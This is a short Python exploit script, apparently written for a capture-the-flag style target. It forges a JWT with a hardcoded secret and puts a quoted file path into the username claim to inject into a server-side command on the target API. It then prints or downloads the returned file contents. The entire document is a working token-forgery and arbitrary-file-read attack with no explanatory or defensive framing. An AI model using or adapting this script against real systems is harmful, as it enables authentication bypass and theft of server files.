#!/usr/bin/python3

##
##

import jwt,requests,sys
import os,sys,re

##
##

if len(sys.argv) < 2:
   print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <archivo>\n")
   print("[\033[1;34m*\033[1;37m] grab arch with -d\n")
   exit(1)

file = sys.argv[1]

def generateJWT(file: str) -> str:
    payload = { "username": "/' {} '/".format(file), "iat": 1666898953 }
    secret = "123beany123"
    token = jwt.encode(payload, secret)
    return token

token = generateJWT(file)
target = "http://things.edu/api/all-leave"
cookies = {"token":token}
request = requests.get(target, cookies=cookies)

try:
    if sys.argv[2] == '-d':
        with open(file.split("/")[-1].strip(),'wb') as f:
            f.write(request.content)

except:
    if request.text == "Failed":
        print("\n[\033[1;31m-\033[1;37m] NADA \n")
        exit(1)
    else:
        print(request.text.strip())

        
##################
##
##
